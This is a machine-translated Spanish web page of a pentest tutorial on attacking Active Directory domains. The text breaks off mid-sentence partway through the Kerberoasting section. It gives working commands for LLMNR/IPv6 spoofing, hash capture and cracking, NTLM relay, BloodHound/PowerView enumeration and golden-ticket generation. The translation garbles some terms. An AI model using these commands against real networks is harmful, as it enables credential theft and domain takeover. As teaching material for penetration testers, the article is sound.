<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üèüÔ∏è üë≤üèº üîº Ataques de dominio üî£ ü§òüèΩ üì©</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Al realizar pruebas de penetraci√≥n, a menudo detectamos errores en la configuraci√≥n del dominio. Aunque esto no parece cr√≠tico para muchos, en realida...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Ataques de dominio</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/449278/"><img src="https://habrastorage.org/webt/om/yi/ln/omyiln4hxyukdu7znc3sn5j-mzy.png"><br>  Al realizar pruebas de penetraci√≥n, a menudo detectamos errores en la configuraci√≥n del dominio.  Aunque esto no parece cr√≠tico para muchos, en realidad, tales imprecisiones pueden comprometer todo el dominio. <br><br>  Por ejemplo, de acuerdo con los resultados del pentest en una compa√±√≠a, llegamos a la conclusi√≥n de que todas las m√°quinas disponibles en el dominio no eran inferiores a Windows10 / Windows Server2016, y ten√≠an todos los parches m√°s recientes.  La red se escaneaba regularmente, las m√°quinas eran dif√≠ciles.  Todos los usuarios se sentaron a trav√©s de tokens y no sab√≠an sus "contrase√±as de 20 caracteres".  Todo parece estar bien, pero IPv6 no se ha deshabilitado.  El esquema de captura de dominio se ve√≠a as√≠: <br><br>  mitm6 -&gt; ntlmrelay -&gt; ataque mediante delegaci√≥n -&gt; se recibe el hash de la contrase√±a del administrador local -&gt; se recibe el hash de la contrase√±a del administrador del dominio. <br><br>  Desafortunadamente, las certificaciones populares como OSCP, GPEN o CEH no ense√±an las pruebas de penetraci√≥n de Active Directory. <br><br>  En este art√≠culo, veremos varios tipos de ataques de Active Directory que llevamos a cabo como parte de pentests, as√≠ como las herramientas utilizadas.  Esto de ninguna manera puede considerarse una gu√≠a completa para todo tipo de ataques y herramientas, realmente hay muchos de ellos, y es dif√≠cil encajar en un art√≠culo. <br><br>  Por lo tanto, para demostraci√≥n, utilizamos una computadora port√°til en Kali Linux 2019 y los hosts virtuales generados en VMware.  Imagine que el objetivo principal del pentest es obtener derechos de administrador de dominio y, como entrada, tenemos acceso a la red corporativa de la empresa a trav√©s de Ethernet.  Para comenzar a probar el dominio, necesitamos una cuenta. <br><a name="habracut"></a><br><h1>  Obtener una cuenta </h1><br>  Considere los dos m√©todos m√°s comunes, en mi opini√≥n, para obtener el nombre de usuario y la contrase√±a de la cuenta de dominio: falsificaci√≥n de LLMNR / NBNS y ataque al protocolo IPv6. <br><br><h3>  Falsificaci√≥n de LLMNR / NBNS </h3><br>  Se ha dicho mucho sobre este ataque.  La conclusi√≥n es que el cliente env√≠a LLMNR de multidifusi√≥n y transmite solicitudes NBT-NS para resolver nombres de host si falla el DNS.  Cualquier usuario de la red puede responder a tales solicitudes. <br><br>  Herramientas que permiten un ataque: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Respuesta</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Inveight</a> </li><li>  M√≥dulos Metasploit: auxiliar / parodia / llmnr / llmnr_response, auxiliar / parodia / nbns / nbns_response, <br>  auxiliar / servidor / captura / smb, auxiliar / servidor / captura / http_ntlm </li></ul><br>  Con un ataque exitoso, podemos obtener el hash NetNTLM de la contrase√±a del usuario. <br><br><pre><code class="bash hljs">Responder -I eth0 -wrf</code> </pre> <br><img src="https://habrastorage.org/webt/ul/6f/1r/ul6f1rsc1dbtugnzoiup43cofnc.png"><br><br>  El hash resultante, podemos depurar o ejecutar retransmisores NTLM. <br><br><h3>  Ataque IPv6 </h3><br>  Si se usa IPv6 en la red corporativa, podemos responder a las solicitudes de DHCPv6 y establecer nuestra direcci√≥n IP como el servidor DNS en la m√°quina atacada.  Como IPv6 tiene prioridad sobre IPv4, las consultas DNS del cliente se enviar√°n a nuestra direcci√≥n.  Lea m√°s sobre el ataque <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br><br>  Herramientas: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">mitm6</a> </li></ul><br>  Ejecutando la utilidad mitm6 <br><br><pre> <code class="bash hljs">mitm6 -i vmnet0</code> </pre> <br>  Despu√©s de que se complete el ataque, aparecer√° un nuevo servidor DNS con nuestra direcci√≥n IPv6 en la estaci√≥n de trabajo atacada. <br><br><img src="https://habrastorage.org/webt/ww/w4/w3/www4w3x2eqtuytsmysia_deoi_y.png"><br><br>  Las m√°quinas atacadas intentar√°n autenticarse con nuestra m√°quina.  Despu√©s de haber elevado el servidor SMB usando la utilidad <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">smbserver.py</a> , podemos obtener hashes de contrase√±a de usuario. <br><br><pre> <code class="bash hljs">smbserver.py -smb2support SMB /root/SMB</code> </pre> <br><img src="https://habrastorage.org/webt/df/s8/jx/dfs8jxcdecrikctqxdxzbuyq8wk.png"><br><br><h2>  Acciones de hash capturadas </h2><br>  El siguiente paso, podemos realizar un ataque criptogr√°fico en los hash de contrase√±a y obtener la contrase√±a en forma clara, o realizar un relevo NTLM. <br><br><h3>  Contrase√±a fuerza bruta </h3><br>  Es simple: toma una contrase√±a hash, hashcat <br><br><pre> <code class="bash hljs">hashcat -m 5600 -a 3 hash.txt /usr/share/wordlists/rockyou.txt</code> </pre> <br>  y brutus.  La contrase√±a se puede obtener o no :) <br><br><img src="https://habrastorage.org/webt/pf/l8/7g/pfl87glgjcfbove5ywlkmul1uyi.png"><br>  <i>Se ha recuperado la contrase√±a de usuario de Harvey - Pbvf2019</i> <br><br><h3>  NTLM Relay </h3><br>  Tambi√©n podemos ejecutar rel√©s NTLM.  Despu√©s de asegurarnos de que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SMB Signing</a> no se usa <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">,</a> usamos la utilidad <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ntlmrelayx.py</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">realizamos</a> un ataque.  Aqu√≠ nuevamente, dependiendo del objetivo, seleccionamos el vector que necesitamos.  Consideremos algunos de ellos. <br><br><br><h4>  Acceso a la m√°quina atacada a trav√©s del protocolo SMB </h4><br>  Realizar un ataque con la tecla <i>i</i> . <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t 192.168.1.5 -l loot -i</code> </pre> <br><img src="https://habrastorage.org/webt/jk/3w/zu/jk3wzuzoxwr2qnrzhagq7bnweya.png"><br><br>  Con un ataque exitoso, podemos conectarnos a la m√°quina remota usando netcat. <br><br><img src="https://habrastorage.org/webt/1f/8x/ba/1f8xbajj3gofx2bonp0quqdnxae.png"><br><br><h4>  Recolecci√≥n de informaci√≥n de dominio </h4><br>  En este caso, realizamos la retransmisi√≥n al controlador de dominio. <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldap://192.168.1.2</code> </pre> <br>  Si el ataque tiene √©xito, obtendremos informaci√≥n detallada sobre el dominio: <br><br><img src="https://habrastorage.org/webt/el/gf/eu/elgfeumon83qjseesppzb8yjitq.png"><br><br><h4>  Agregar una nueva computadora al dominio </h4><br>  Cada usuario por defecto tiene la capacidad de crear hasta 10 computadoras en el dominio.  Para crear una computadora, debe ejecutar un rel√© en un controlador de dominio utilizando el protocolo ldaps.  Est√° prohibido crear usuarios y computadoras a trav√©s de una conexi√≥n ldap sin cifrar.  Adem√°s, no se puede crear una cuenta si se intercepta la conexi√≥n a trav√©s de SMB. <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldaps://192.168.1.2 --add-computer</code> </pre> <br><img src="https://habrastorage.org/webt/ei/xe/qi/eixeqiuxwttuxx3xmmroqrj8smy.png"><br><br>  Como puede ver en la figura, pudimos crear una computadora RORYOTGS $. <br><br>  Al crear m√°s de 10 computadoras, obtenemos un error de la siguiente forma: <br><br><img src="https://habrastorage.org/webt/gb/za/ar/gbzaarxwpzhs0zhy4zi8kvwuqjo.png"><br><br>  Usando las credenciales de una computadora RORYOTGS $, podemos realizar solicitudes leg√≠timas a un controlador de dominio. <br><br><h1>  Recolecci√≥n de informaci√≥n de dominio </h1><br>  Entonces, tenemos un usuario de dominio o una cuenta de computadora.  Para continuar con las pruebas, necesitamos recopilar informaci√≥n disponible para una mayor planificaci√≥n de ataques.  Considere algunas de las herramientas que nos ayudar√°n a determinar la b√∫squeda de los sistemas m√°s cr√≠ticos, planificar y ejecutar un ataque. <br><br><h3>  Sabueso </h3><br>  Una de las herramientas m√°s importantes que se utiliza en casi todas las pruebas de penetraci√≥n interna.  El proyecto se desarrolla activamente y se complementa con nuevas caracter√≠sticas. <br><br><div class="spoiler">  <b class="spoiler_title">Informaci√≥n recopilada por sabueso</b> <div class="spoiler_text"><ul><li>  Grupo: realiza la recopilaci√≥n de miembros del grupo </li><li>  LocalAdmin: realiza una recopilaci√≥n de administrador local </li><li>  RDP: realiza la colecci√≥n de usuarios de escritorio remoto </li><li>  DCOM: realiza la colecci√≥n de usuarios COM distribuidos </li><li>  GPOLocalGroup: realiza una recopilaci√≥n de administraci√≥n local mediante objetos de directiva de grupo </li><li>  Sesi√≥n: realiza la recopilaci√≥n de sesiones </li><li>  ComputerOnly: realiza la administraci√≥n local, RDP, DCOM y la recopilaci√≥n de sesiones </li><li>  LoggedOn: realiza una recopilaci√≥n de sesiones privilegiadas (requiere derechos de administrador en los sistemas de destino) </li><li>  Fideicomisos: realiza la enumeraci√≥n de confianza de dominio </li><li>  ACL: realiza la colecci√≥n de ACL </li><li>  Contenedor: realiza la recolecci√≥n de contenedores; </li><li>  DcOnly: realiza la recopilaci√≥n solo con LDAP.  Incluye Group, Trusts, ACL, ObjectProps, Container y GPOLocalGroup </li><li>  Todos: realiza todos los m√©todos de recopilaci√≥n excepto GPOLocalGroup y LoggedOn </li><li>  Buscar bosque: busca todos los dominios del bosque en lugar de solo el actual </li><li>  Dominio: busca un dominio en particular.  Utiliza su dominio actual si es nulo (Predeterminado: nulo) </li><li>  Stealth: realiza m√©todos de recolecci√≥n de sigilo.  Todas las opciones de sigilo son de un solo hilo </li><li>  SkipGCDeconfliction: omita la desconflicci√≥n del cat√°logo global durante la enumeraci√≥n de la sesi√≥n.  Esto puede acelerar la enumeraci√≥n, pero dar√° lugar a posibles imprecisiones en los datos. </li><li>  ExcludeDc: excluye los controladores de dominio de la enumeraci√≥n (evita los indicadores de Microsoft ATA) </li><li>  ComputerFile: especifique un archivo para cargar nombres de computadora / IP desde </li><li>  OU: especifique qu√© OU enumerar </li></ul><br></div></div><br>  Los recopiladores de informaci√≥n son <a href="">SharpHound.exe</a> (requiere .NET instalado v3.5) y el script <a href="">SharpHound.ps1</a> escrito en powershell.  Tambi√©n hay un compilador escrito por un desarrollador <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">externo de</a> Python, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Bloodhound-python</a> . <br><br>  Como base de datos, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">se</a> utiliza <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Neo4j</a> , que tiene su propia sintaxis, que le permite realizar consultas personalizadas.  Puede leer m√°s sobre la sintaxis <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Fuera de la caja 12 solicitudes est√°n disponibles</b> <div class="spoiler_text"><ul><li>  Encuentra todos los administradores de dominio </li><li>  Encuentre las rutas m√°s cortas para los administradores de dominio </li><li>  Encuentre directores con derechos DCSync </li><li>  Usuarios con membres√≠a de grupo de dominio extranjero </li><li>  Grupos con membres√≠a de grupo de dominio extranjero </li><li>  Asignar confianzas de dominio </li><li>  Caminos m√°s cortos hacia sistemas de delegaci√≥n sin restricciones </li><li>  Los caminos m√°s cortos de los usuarios de Kerberoastable </li><li>  Las rutas m√°s cortas a los administradores de dominio de los usuarios de Kerberoastable </li><li>  El camino m√°s corto de los directores propios </li><li>  Rutas m√°s cortas para administradores de dominio de directores propios </li><li>  Caminos m√°s cortos hacia objetivos de alto valor </li></ul><br></div></div><br>  Los desarrolladores tambi√©n proporcionan el script <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">DBCreator.py</a> , que le permite generar una base de datos aleatoria para realizar pruebas. <br><br><img src="https://habrastorage.org/webt/do/if/95/doif95xzpkhd3xqbdjbwdenmrfu.png"><br><br>  Neo4j tiene una API REST.  Hay varias utilidades que pueden conectarse a la base de datos y usar los datos recibidos: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Cypherdog</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Gofetch</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ANGRYPUPPY</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">generador-gt</a> </li></ul><br>  Consideremos algunos de ellos. <br><br><h3>  Cypherdog </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">CypherDog</a> es un shell BloodHound escrito en powershell.  Incluye 27 cmdlets. <br><br><div class="spoiler">  <b class="spoiler_title">Lista de cmdlet</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Cmdlet </td><td>  Sinopsis </td></tr><tr><td>  Get-BloodHoundCmdlet </td><td>  BloodHound RTFM - Obtener Cmdlet </td></tr><tr><td>  Enviar-sabueso </td><td>  BloodHound POST - Cypher a la API REST </td></tr><tr><td>  Get-BloodHoundNode </td><td>  Nodo BloodHound - Obtener nodo </td></tr><tr><td>  Search-BloodHoundNode </td><td>  Nodo BloodHound - Nodo de b√∫squeda </td></tr><tr><td>  New-BloodHoundNode </td><td>  Nodo BloodHound - Crear nodo </td></tr><tr><td>  Set-bloodhoundnode </td><td>  Nodo BloodHound - Nodo Actualizar </td></tr><tr><td>  Remove-BloodHoundNode </td><td>  Nodo BloodHound - Eliminar nodo </td></tr><tr><td>  Get-BloodHoundNodeList </td><td>  BloodHound Node - Obtener lista </td></tr><tr><td>  Get-BloodHoundNodeHighValue </td><td>  Nodo BloodHound - Obtenga HighValue </td></tr><tr><td>  Get-BloodHoundNodeOwned </td><td>  Nodo BloodHound - Hazte due√±o </td></tr><tr><td>  Get-BloodHoundNodeNote </td><td>  BloodHound Node - Obtenga nota </td></tr><tr><td>  Set-BloodHoundNodeNote </td><td>  Nodo BloodHound - Establecer notas </td></tr><tr><td>  Get-BloodHoundBlacklist </td><td>  BloodHound Node - Obtener lista negra </td></tr><tr><td>  Set-BloodHoundBlacklist </td><td>  BloodHound Node - Establecer lista negra </td></tr><tr><td>  Eliminar-BloodHoundBlacklist </td><td>  Nodo BloodHound - Eliminar lista negra </td></tr><tr><td>  Get-BloodHoundEdge </td><td>  BloodHound Edge - Obtener objetivo </td></tr><tr><td>  Get-BloodHoundEdgeReverse </td><td>  BloodHound Edge - Obtener fuente </td></tr><tr><td>  Get-BloodHoundEdgeCrossDomain </td><td>  BloodHound Edge - Obtenga CrossDomain </td></tr><tr><td>  Get-BloodHoundEdgeCount </td><td>  BloodHound Edge - Obtener cuenta </td></tr><tr><td>  Get-BloodHoundEdgeInfo </td><td>  BloodHound Edge - Obtener informaci√≥n </td></tr><tr><td>  New-BloodHoundEdge </td><td>  BloodHound Edge - Crear borde </td></tr><tr><td>  Remove-BloodHoundEdge </td><td>  BloodHound Edge - Eliminar borde </td></tr><tr><td>  Get-BloodHoundPathShort </td><td>  BloodHound Path - Hazte m√°s corto </td></tr><tr><td>  Get-BloodHoundPathAny </td><td>  BloodHound Path - Consigue cualquiera </td></tr><tr><td>  Get-BloodHoundPathCost </td><td>  BloodHound Path - Obtenga Costo </td></tr><tr><td>  Get-BloodHoundPathCheap </td><td>  BloodHound Path - Hazte m√°s barato </td></tr><tr><td>  Get-BloodHoundWald0IO </td><td>  BloodHound Path - Obtenga el √≠ndice Wald0 </td></tr></tbody></table></div><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Ejemplos de uso</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  El equipo </td><td>  Descripci√≥n </td></tr><tr><td>  Search-BloodHoundNode -Type Computer -Property unconstraineddelegation -Value $ true |  seleccionar nombre, nombres principales de servicio, delegaci√≥n sin restricciones, sistema operativo |  Lista de formatos </td><td>  Busque equipos con delegaci√≥n Kerberos ilimitada </td></tr><tr><td>  Usuario Edge ADMINISTRATOR@JET.LAB Miembro del Grupo </td><td>  Lista de grupos de usuarios </td></tr><tr><td>  ¬øQu√© computadora tiene sesi√≥n Usuario ADMINISTRADOR@JET.LAB </td><td>  Enumerar las computadoras donde hay una sesi√≥n de usuario Administrador </td></tr><tr><td>  Usuario de ruta Computadora HARVEY@JET.LAB DC1.JET.LAB </td><td>  Imprima la ruta del usuario al controlador de dominio </td></tr><tr><td>  qu√© usuario MemberOf Group 'DOMAIN ADMINS@JET.LAB' * |  lista de inicio de sesi√≥n </td><td>  Enumerar sesiones de usuario activas que son miembros del grupo de administradores DOMAIN </td></tr><tr><td>  qu√© usuario MemberOf Group 'DOMAIN ADMINS@JET.LAB' |  lista de inicio de sesi√≥n |  opera * -mache 7 |  lista AdminTo |  seleccione nombre </td><td>  Enumere los usuarios que tienen derechos de administrador en estaciones de trabajo que ejecutan Windows 7 que tienen una sesi√≥n de usuarios del grupo de administradores de dominio </td></tr></tbody></table></div><br></div></div><br>  Por defecto, se requiere autenticaci√≥n para acceder a la base de datos neo4j.  Puede deshabilitar la autenticaci√≥n editando el archivo neo4j.conf.  Necesita descomentar la l√≠nea <i>dbms.security.auth_enabled = false.</i>  Pero esto no se recomienda, ya que cualquier usuario puede conectarse a la base de datos en 127.0.0.1:7474 (la configuraci√≥n predeterminada).  Puede leer m√°s sobre autenticaci√≥n y autorizaci√≥n en neo4j <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aqu√≠.</a> <br><br><h3>  Gofetch </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GoFetch</a> utiliza un gr√°fico creado en sabueso para planificar y ejecutar un ataque. <br><br><div class="spoiler">  <b class="spoiler_title">Ejemplo de gr√°fico de sabueso</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/l3/pm/g_/l3pmg_9fw8yy5dkbrftpfq4flyo.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">L√≥gica GoFetch</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ph/g-/us/phg-usiezxoh0-jz2zvfq4iack8.jpeg"><br></div></div><br>  Lanzamiento de ataque <br><br><pre> <code class="bash hljs">.\Invoke-GoFetch.ps1 -PathToGraph .\pathFromBloodHound.json</code> </pre> <br><h3>  generador-gt </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">gt-generator</a> , utilizando datos de BloodHound, facilita la creaci√≥n de tickets dorados.  Para recibir un ticket dorado, solo se requiere el hash de nombre de usuario y contrase√±a del usuario KRBTGT. <br><br><pre> <code class="bash hljs">python gt-generator.py -s 127.0.0.1 -u user -p pass administrator &lt;KRBTGT_HASH&gt;</code> </pre> <br><img src="https://habrastorage.org/webt/oo/d3/b8/ood3b84ooqbwwawb-pn7nybey_s.png"><br><br><h3>  Powerview </h3><br>  <a href="">PowerView</a> es un marco de Powershell incluido con <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PowerSploit</a> .  La siguiente es una lista de algunos cmdlets que pueden ayudarlo a recopilar informaci√≥n sobre un dominio. <br><br><div class="spoiler">  <b class="spoiler_title">Lista de cmdlet</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Get-NetDomain -Domain jet.lab </td><td>  Obtener el dominio actual </td></tr><tr><td>  Get-domainSID </td><td>  Obtener el SID de dominio actual </td></tr><tr><td>  Get-NetDomainController -Domain jet.lab </td><td>  Obtenga controladores de dominio para un dominio </td></tr><tr><td>  Get-NetUser -Domain jet.lab -UserName labuser </td><td>  Obtener usuarios de un dominio </td></tr><tr><td>  Get-NetGroup * group_name * </td><td>  Obtener todos los grupos en el dominio actual </td></tr><tr><td>  Get-NetGroupMember -GroupName "Administradores de dominio" </td><td>  Obtenga todos los miembros del grupo Administradores de dominio </td></tr><tr><td>  Get-NetGroup -UserName "dominio_usuario" </td><td>  Obtener la membres√≠a de grupo para un usuario </td></tr><tr><td>  Get-NetComputer -FullData </td><td>  Obtenga todas las computadoras del dominio </td></tr><tr><td>  Find-LocalAdminAccess -Verbose </td><td>  Encuentra todas las m√°quinas en el dominio actual donde el usuario actual tiene acceso de administrador local </td></tr><tr><td>  Get-NetSession -ComputerName dc02.jet.lab </td><td>  Lista de sesiones en una computadora en particular </td></tr><tr><td>  Invoke-UserHunter -CheckAccess </td><td>  Encuentre las computadoras donde un administrador de dominio ha iniciado sesi√≥n y el usuario actual tiene acceso </td></tr></tbody></table></div><br></div></div><br><h3>  Adidnsdump </h3><br>  Al usar DNS integrado en Active Directory, cualquier usuario de dominio puede consultar todos los registros DNS predeterminados. <br><br>  Herramienta utilizada: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Adidnsdump.</a> <br><br><img src="https://habrastorage.org/webt/hq/48/rb/hq48rboxepskftc5tnlbsnvgfr0.gif"><br><br><h1>  Ataques de dominio </h1><br>  Ahora que tenemos la informaci√≥n del dominio, pasamos a la siguiente fase de las pruebas de penetraci√≥n, directamente al ataque.  Considere 4 vectores potenciales: <br><br><ol><li>  Asado </li><li>  Ataque a trav√©s de ACL </li><li>  Delegaci√≥n Kerberos </li><li>  Abusar de los permisos de GPO </li></ol><br><br><h3>  Asado </h3><br>  Este tipo de ataque apunta al protocolo Kerberos.  Hay 2 tipos de ataque como el asado: <br><br><ul><li>  Kerberoast </li><li>  Asreproast </li></ul><br><h4>  Kerberoast </h4><br>  El ataque fue demostrado por primera vez por el usuario <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">timmedin</a> en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">DerbyCon</a> en 2014 ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">video</a> ).  Con un ataque exitoso, podremos resolver la contrase√±a del servicio de ultrasonido en modo fuera de l√≠nea, sin temor a bloquear al usuario.  Muy a menudo, las cuentas de servicio tienen derechos excesivos y una contrase√±a perpetua, lo que puede permitirnos obtener derechos de administrador de dominio. <br>  Para comprender la esencia del ataque, considere c√≥mo funciona Kerberos. <br><br><img src="https://habrastorage.org/webt/vj/g2/ud/vjg2ud1wzdr89drnazgcob0eaum.png"><br><br>  1. La contrase√±a se convierte en un hash NTLM, la marca de tiempo se cifra con un hash y se env√≠a a KDC como un autenticador en la solicitud de ticket TGT (AS-REQ).  El controlador de dominio (KDC) verifica la informaci√≥n del usuario y crea un ticket TGT. <br><br>  2. El ticket TGT se cifra, firma y env√≠a al usuario (AS-REP).  Solo el servicio Kerberos (KRBTGT) puede abrir y leer datos de un ticket TGT. <br><br>  3. El usuario env√≠a el ticket TGT al controlador de dominio a pedido del ticket TGS (TGS-REQ).  El controlador de dominio abre un ticket TGT y verifica la suma de control PAC. <br><br>  4. El ticket TGS se cifra con el hash NTLM de la contrase√±a de la cuenta de servicio y se env√≠a al usuario (TGS-REP). <br><br>  5. El usuario proporciona un ticket TGS a la computadora en la que se ejecuta el servicio (AP-REQ).  El servicio abre un ticket TGS utilizando su hash NTLM. <br><br>  6. Se proporciona acceso al servicio (AS-REP). <br><br>  Despu√©s de recibir un ticket TGS (TGS-REP), podemos encontrar la contrase√±a de la cuenta de servicio sin conexi√≥n.  Por ejemplo, usando hashcat. <br><br>  Seg√∫n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">RFC396</a> , 20 tipos de cifrado est√°n reservados para el protocolo Kerberos.  Los tipos de cifrado que se usan ahora, en orden de prioridad: <br><br><ul><li>  AES256_CTS_HMAC_SHA1 </li><li>  AES128_CTS_HMAC_SHA1 </li><li>  RC4_HMAC_MD5 </li></ul><br>  En versiones recientes de Windows, el cifrado AES se usa de manera predeterminada.  Pero para la compatibilidad con sistemas por debajo de Windows Vista y Windows 2008, se requiere soporte para el algoritmo RC4.  Cuando se realiza un ataque, siempre se intenta primero obtener un ticket TGS con el cifrado RC4_HMAC_MD5, que permite ordenar las contrase√±as m√°s r√°pidas, y luego con el resto.  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Harmj0y</a> realiz√≥ un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">estudio</a> interesante y descubri√≥ que si especifica solo el soporte de cifrado Kerberos AES128 y AES256 en las propiedades del usuario, el ticket Kerberos todav√≠a se emite con cifrado RC4_HMAC_MD5. <br><br><img src="https://habrastorage.org/webt/el/4w/vn/el4wvniixybekufn7jswfcr7pey.png"><br><br>  Deshabilitar RC4_HMAC_MD5 es necesario a nivel de 